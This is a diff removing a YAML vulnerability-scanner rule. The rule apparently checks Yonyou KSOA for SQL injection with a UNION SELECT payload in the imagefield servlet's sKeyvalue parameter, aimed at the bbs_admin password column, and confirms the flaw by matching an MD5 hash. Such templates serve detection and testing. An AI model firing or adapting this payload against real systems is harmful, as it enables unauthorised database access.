@@ -1,8 +1,0 @@
-name: yongyou-ksoa-sKeyvalue-sqli
-rules:
-  - method: GET
-    path: '/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+'
-    expression: | 
-      response.status == 200 && response.body.bcontains(b'0x098f6bcd4621d373cade4e832627b4f6')
-detail:
-  author: 666
